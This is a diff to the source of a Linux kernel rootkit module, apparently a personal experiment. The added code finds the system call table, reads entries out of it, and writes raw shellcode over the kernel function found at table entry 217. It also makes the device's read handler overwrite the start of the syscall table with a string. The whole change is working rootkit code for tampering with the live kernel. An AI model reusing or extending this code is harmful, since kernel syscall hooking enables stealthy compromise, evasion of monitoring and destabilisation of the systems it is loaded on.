@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include "pwhrootkit.h"
 #include <linux/uaccess.h>
 #include <linux/init_task.h>
@@ -75,15 +76,23 @@ static void funny_joke(void){
 }
 
 
-
 static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
+    funny_joke();
+    arbitrary_remap_write((void *)(syscall_table_addr), "peiwithhao", 10);
     return 0;
 }
 
 
 static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
-    void *hook_ptr = funny_joke;
-    arbitrary_remap_write((void *)(syscall_table_addr), &hook_ptr, sizeof(size_t));
+    //void *hook_ptr = funny_joke;
+    u8 shellcode[9] = { 0x48, 0xC7, 0xC0, 0x03, 0x02, 0x01, 0x81, 0xFF, 0xE0 };
+    size_t poll_addr;
+
+    /* 寻找系统调用表 */
+    sys_call_table_finder();
+    printk(KERN_INFO "sys_read_addr: 0x%lx", ((size_t *)syscall_table_addr)[7]);
+    poll_addr = ((size_t *)syscall_table_addr)[217];
+    arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
     return 0;
 }
 static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
